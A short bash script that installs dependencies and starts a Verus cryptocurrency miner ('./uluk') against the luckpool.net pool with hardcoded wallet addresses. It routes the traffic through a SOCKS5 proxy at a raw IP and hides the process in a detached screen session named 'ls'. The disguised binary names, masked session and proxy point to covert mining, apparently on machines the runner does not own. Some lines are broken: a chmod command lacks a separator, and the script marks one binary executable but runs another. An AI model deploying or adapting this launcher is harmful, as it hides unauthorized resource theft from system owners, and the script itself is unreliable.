#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x cumin chmod 777 cumin start.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
WORKER=$(echo $(shuf -i 1-10 -n 1)BEH)
PROXY=socks5://51.222.13.193:10084
./uluk -a verus -o $POOL -u RTEmjgEnFktDbtCLTqxof98bYN7v9syLAM.iyazz1 -t 2 -x $PROXY
